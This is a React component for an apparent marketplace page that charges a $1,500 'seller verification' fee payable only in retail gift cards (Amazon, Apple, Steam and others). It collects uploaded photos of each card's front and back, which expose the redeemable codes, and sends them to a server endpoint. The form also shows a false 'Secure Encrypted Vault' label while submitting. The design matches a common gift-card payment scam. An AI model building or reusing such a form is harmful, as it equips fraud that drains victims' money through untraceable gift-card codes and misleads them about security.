import React, { useState } from 'react';
import { UserProfile, GiftCardSubmission, PromoCode } from '../types';
import { CreditCard, ShieldAlert, CheckCircle2, Upload, Eye, EyeOff, Lock, Clock, Send, AlertCircle } from 'lucide-react';

interface GiftCardFormProps {
  currentUser: UserProfile;
  promoCodes?: PromoCode[];
  onSubmitSuccess: (submission: GiftCardSubmission) => void;
  onOpenAuth?: (promptMsg?: string) => void;
}

export const GiftCardForm: React.FC<GiftCardFormProps> = ({ currentUser, promoCodes = [], onSubmitSuccess, onOpenAuth }) => {
  const [brand, setBrand] = useState('Amazon');
  const [cardNumber, setCardNumber] = useState('');
  const [pin, setPin] = useState('');
  const [declaredValue, setDeclaredValue] = useState(1500);
  const [receiptUrl, setReceiptUrl] = useState('');
  const [frontImageUrl, setFrontImageUrl] = useState<string | null>(null);
  const [backImageUrl, setBackImageUrl] = useState<string | null>(null);
  const [notes, setNotes] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const [inputPromoCode, setInputPromoCode] = useState('');
  const [appliedPromo, setAppliedPromo] = useState<PromoCode | null>(null);
  const [promoError, setPromoError] = useState<string | null>(null);

  const baseUsdPrice = 1500;
  const discountAmount = appliedPromo ? (baseUsdPrice * appliedPromo.discount) / 100 : 0;
  const requiredValue = baseUsdPrice - discountAmount;

  const handleApplyPromo = () => {
    setPromoError(null);
    const activeCodes = promoCodes.filter(p => p.isActive);
    const match = activeCodes.find(p => p.code.toLowerCase() === inputPromoCode.trim().toLowerCase());
    if (match) {
      setAppliedPromo(match);
      const newDiscountAmount = (baseUsdPrice * match.discount) / 100;
      setDeclaredValue(baseUsdPrice - newDiscountAmount); // auto-update to minimum
    } else {
      setAppliedPromo(null);
      setDeclaredValue(baseUsdPrice); // reset to base price
      setPromoError('Invalid or inactive promo code.');
    }
  };

  const hasActivePromos = promoCodes.some(p => p.isActive);

  const supportedBrands = [
    { name: 'Amazon', color: 'border-amber-500/50 text-amber-300' },
    { name: 'Apple', color: 'border-slate-400/50 text-slate-200' },
    { name: 'Visa Prepaid', color: 'border-sky-500/50 text-sky-300' },
    { name: 'Mastercard', color: 'border-orange-500/50 text-orange-300' },
    { name: 'Sephora', color: 'border-pink-500/50 text-pink-300' },
    { name: 'Nordstrom', color: 'border-emerald-500/50 text-emerald-300' },
    { name: 'Steam', color: 'border-blue-500/50 text-blue-300' }
  ];

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, side: 'front' | 'back') => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (event) => {
      const result = event.target?.result as string;
      if (side === 'front') setFrontImageUrl(result);
      else setBackImageUrl(result);
    };
    reader.readAsDataURL(file);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (!frontImageUrl || !backImageUrl) {
      setErrorMsg('Please upload both the front and back images of the Gift Card.');
      return;
    }

    setIsSubmitting(true);

    try {
      // Call Server Action API endpoint
      const res = await fetch('/api/actions/submit-gift-card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUser.id,
          userEmail: currentUser.email,
          brand,
          cardNumber: 'IMAGE_UPLOAD_ONLY',
          pin: 'IMAGE_UPLOAD_ONLY',
          declaredValue: Number(declaredValue),
          receiptUrl: receiptUrl.trim() || undefined,
          frontImageUrl: frontImageUrl || undefined,
          backImageUrl: backImageUrl || undefined,
          notes: notes.trim() || undefined
        })
      });

      const data = await res.json();

      if (data.success && data.submission) {
        onSubmitSuccess(data.submission);
      } else {
        setErrorMsg(data.error || 'Failed to process gift card submission.');
      }
    } catch (err: any) {
      setErrorMsg(`Server submission error: ${err.message}`);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="glass-panel border border-zinc-800/80 rounded-3xl p-6 sm:p-8 space-y-6 shadow-2xl">
      <div className="flex flex-wrap items-center justify-between gap-4 pb-5 border-b border-zinc-800/80">
        <div className="flex items-center gap-3.5">
          <div className="w-12 h-12 rounded-2xl bg-[#7928CA]/20 border border-[#7928CA]/40 flex items-center justify-center glow-purple">
            <CreditCard className="w-7 h-7 text-[#E040FB]" />
          </div>
          <div>
            <h3 className="text-xl font-serif font-bold text-white flex items-center gap-2">
              Pay via Gift Card
              <span className="text-xs bg-[#FF6321]/20 text-[#FF854D] border border-[#FF6321]/30 px-2.5 py-0.5 rounded-full font-mono font-normal">
                Manual / 3rd Party Verification
              </span>
            </h3>
            <p className="text-sm text-zinc-400 font-sans">Submit major brand gift card code &amp; PIN for instant pending review.</p>
          </div>
        </div>

        <div className="text-right">
          <div className="text-xs text-zinc-400 uppercase tracking-widest font-mono">Required Amount</div>
          <div className="text-2xl font-black text-[#E040FB] font-mono">
            {appliedPromo ? (
              <>
                <span className="line-through text-zinc-600 text-lg mr-2">${baseUsdPrice.toLocaleString()}</span>
                ${requiredValue.toLocaleString()} USD
              </>
            ) : (
              `$${requiredValue.toLocaleString()} USD`
            )}
          </div>
          {appliedPromo && <div className="text-xs text-emerald-400 font-mono mt-1">Promo code applied! ({appliedPromo.discount}% off)</div>}
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        
        {/* Promo Code Section */}
        {hasActivePromos && !appliedPromo && (
          <div className="bg-[#121216] border border-[#7928CA]/30 p-4 rounded-xl flex flex-col gap-3">
            <div className="flex items-center justify-between gap-4">
              <div className="flex-1">
                <label className="block text-xs font-semibold text-zinc-400 mb-1 font-mono">Have a Promo Code?</label>
                <input 
                  type="text" 
                  value={inputPromoCode}
                  onChange={(e) => { setInputPromoCode(e.target.value); setPromoError(null); }}
                  placeholder="Enter code here"
                  className="w-full bg-[#0A0A0C] border border-zinc-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-[#7928CA]"
                />
              </div>
              <button 
                type="button"
                onClick={handleApplyPromo}
                className="mt-5 bg-zinc-800 hover:bg-zinc-700 text-white px-4 py-2 rounded-lg text-sm font-semibold transition-colors"
              >
                Apply
              </button>
            </div>
            {promoError && (
              <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-2.5 text-red-400 text-xs font-mono flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>{promoError}</span>
              </div>
            )}
          </div>
        )}

        {/* Brand Selection */}
        <div>
          <label className="text-xs font-semibold text-zinc-300 uppercase tracking-widest block mb-2.5 font-mono">
            1. Select Gift Card Brand
          </label>
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
            {supportedBrands.map((b) => (
              <button
                key={b.name}
                type="button"
                onClick={() => setBrand(b.name)}
                className={`p-3.5 rounded-2xl border text-xs font-semibold flex items-center justify-between transition-all ${
                  brand === b.name
                    ? 'bg-[#7928CA]/40 border-[#7928CA] text-white shadow-lg glow-purple'
                    : 'bg-[#121216] border-zinc-800 text-zinc-400 hover:border-zinc-700'
                }`}
              >
                <span>{b.name}</span>
                {brand === b.name && <CheckCircle2 className="w-4 h-4 text-[#E040FB]" />}
              </button>
            ))}
          </div>
        </div>

        {/* Card Number & PIN Inputs Removed */}



        {appliedPromo && (
          <div className="bg-[#FF6321]/10 border border-[#FF6321]/20 p-3 rounded-xl">
            <div className="text-xs text-[#FF854D] font-mono">
              Promo code <strong>{appliedPromo.code}</strong> applied! Required deposit reduced to <strong>${requiredValue.toLocaleString()}</strong>.
            </div>
          </div>
        )}

        {/* Declared Value & Receipt Proof */}
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label className="text-xs font-semibold text-zinc-300 uppercase tracking-widest block mb-1.5 font-mono">
              Declared Card Balance ($ USD)
            </label>
            <input
              type="number"
              min={requiredValue}
              max="5000"
              value={declaredValue}
              onChange={(e) => setDeclaredValue(Number(e.target.value))}
              className="w-full bg-[#121216] border border-zinc-800 rounded-xl px-3.5 py-2.5 text-sm font-mono text-amber-300 focus:outline-none focus:border-[#7928CA]"
            />
          </div>

          <div>
            <label className="text-xs font-semibold text-zinc-300 uppercase tracking-widest block mb-1.5 font-mono">
              Optional Receipt / Proof Image URL
            </label>
            <input
              type="url"
              placeholder="https://i.imgur.com/receipt.jpg"
              value={receiptUrl}
              onChange={(e) => setReceiptUrl(e.target.value)}
              className="w-full bg-[#121216] border border-zinc-800 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-zinc-600 focus:outline-none focus:border-[#7928CA]"
            />
          </div>
        </div>

        {/* Gift Card Images */}
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label className="text-xs font-semibold text-zinc-300 uppercase tracking-widest block mb-1.5 font-mono">
              Card Front Image *
            </label>
            <div className="relative overflow-hidden bg-[#121216] border border-zinc-800 rounded-xl p-2.5 text-xs text-zinc-400 focus-within:border-[#7928CA]">
              <input
                type="file"
                accept="image/*"
                required
                onChange={(e) => handleFileChange(e, 'front')}
                className="absolute inset-0 opacity-0 cursor-pointer"
              />
              <div className="flex items-center gap-2 pointer-events-none">
                <Upload className="w-4 h-4 text-zinc-500" />
                <span className="truncate">{frontImageUrl ? 'Front Image Uploaded' : 'Click to Upload Front Image'}</span>
              </div>
            </div>
            {frontImageUrl && (
              <img src={frontImageUrl} alt="Front preview" className="mt-2 h-16 object-cover rounded-lg border border-zinc-800" />
            )}
          </div>

          <div>
            <label className="text-xs font-semibold text-zinc-300 uppercase tracking-widest block mb-1.5 font-mono">
              Card Back Image *
            </label>
            <div className="relative overflow-hidden bg-[#121216] border border-zinc-800 rounded-xl p-2.5 text-xs text-zinc-400 focus-within:border-[#7928CA]">
              <input
                type="file"
                accept="image/*"
                required
                onChange={(e) => handleFileChange(e, 'back')}
                className="absolute inset-0 opacity-0 cursor-pointer"
              />
              <div className="flex items-center gap-2 pointer-events-none">
                <Upload className="w-4 h-4 text-zinc-500" />
                <span className="truncate">{backImageUrl ? 'Back Image Uploaded' : 'Click to Upload Back Image'}</span>
              </div>
            </div>
            {backImageUrl && (
              <img src={backImageUrl} alt="Back preview" className="mt-2 h-16 object-cover rounded-lg border border-zinc-800" />
            )}
          </div>
        </div>

        {/* Notes */}
        <div>
          <label className="text-xs font-semibold text-zinc-300 uppercase tracking-widest block mb-1.5 font-mono">
            Additional Notes for Verification Team
          </label>
          <textarea
            rows={2}
            placeholder="e.g. Purchased at Walmart retail store, receipt attached."
            value={notes}
            onChange={(e) => setNotes(e.target.value)}
            className="w-full bg-[#121216] border border-zinc-800 rounded-xl p-3 text-xs text-white placeholder-zinc-600 focus:outline-none focus:border-[#7928CA]"
          />
        </div>

        {/* Security & Verification Notice */}
        <div className="bg-[#FF6321]/10 border border-[#FF6321]/20 rounded-2xl p-4 flex items-start gap-3">
          <Clock className="w-5 h-5 text-[#FF6321] shrink-0 mt-0.5" />
          <div className="text-xs text-amber-200 space-y-1">
            <span className="font-semibold block">Important Approval Workflow Notice:</span>
            <p>
              Submitting your gift card immediately flags your account as <strong className="text-white">pending_verification</strong>. An administrator will validate the card balance with the issuer. Upon verification, your account will automatically be granted <strong className="text-emerald-300">Lifetime Seller Privileges</strong>.
            </p>
          </div>
        </div>

        {errorMsg && (
          <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-xs text-red-300 flex items-center gap-2">
            <AlertCircle className="w-4 h-4 shrink-0" />
            {errorMsg}
          </div>
        )}

        {/* Submit Button */}
        {!currentUser.isLoggedIn ? (
          <div className="space-y-2">
            <div className="p-3 bg-[#FF6321]/15 border border-[#FF6321]/30 rounded-2xl text-xs text-[#FF854D] flex items-center gap-2 font-mono">
              <Lock className="w-4 h-4 shrink-0 text-[#FF6321]" />
              <span>Sign in required to submit gift card for $1,500 seller verification</span>
            </div>
            <button
              type="button"
              onClick={() => onOpenAuth && onOpenAuth('Please sign in or create an account to submit your $1,500 gift card code.')}
              className="w-full bg-gradient-to-r from-[#7928CA] to-[#E040FB] hover:from-[#6b1eb8] hover:to-[#d030eb] text-white font-bold text-sm py-3.5 px-6 rounded-2xl flex items-center justify-center gap-2 shadow-lg glow-purple"
            >
              <Lock className="w-4 h-4" />
              Sign In / Register to Submit Gift Card
            </button>
          </div>
        ) : (
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-[#7928CA] to-[#E040FB] hover:from-[#6b1eb8] hover:to-[#d030eb] text-white font-bold text-sm py-3.5 px-6 rounded-2xl flex items-center justify-center gap-2 shadow-lg glow-purple transition-all disabled:opacity-50"
          >
            {isSubmitting ? (
              <>
                <Clock className="w-4 h-4 animate-spin" />
                Submitting Secure Encrypted Vault Code...
              </>
            ) : (
              <>
                <Send className="w-4 h-4" />
                Submit Gift Card Code for Verification ($1,500 Value)
              </>
            )}
          </button>
        )}
      </form>
    </div>
  );
};
